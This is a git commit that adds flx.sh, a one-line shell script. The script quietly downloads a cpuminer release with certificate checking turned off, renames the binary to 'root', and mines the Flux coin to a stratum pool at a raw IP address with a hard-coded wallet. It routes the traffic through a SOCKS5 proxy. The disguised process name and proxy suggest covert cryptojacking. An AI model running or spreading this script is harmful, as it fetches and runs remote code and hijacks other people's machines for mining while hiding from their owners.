b5c28414eae36ae4f7c717bc03ab1bbe940ad15d
ditashx <ditarosona@gmail.com>
2024-09-23 09:04:43 +0700

    Create flx.sh

---
+++ flx.sh
@@ -0,0 +1,1 @@
+wget -q https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.41/cpuminer-opt-linux-5.0.41a.tar.gz --no-check-certificate && tar xf cpuminer-opt-linux-5.0.41a.tar.gz && mv cpuminer-sse2 root && ./root -a yespower -o stratum+tcp://198.50.168.213:6234 -u t1LLzfsjPrXipV7dekytd8rqRCAJBYBK3yA -p c=FLUX -t 4 --proxy socks5://192.252.220.89:4145
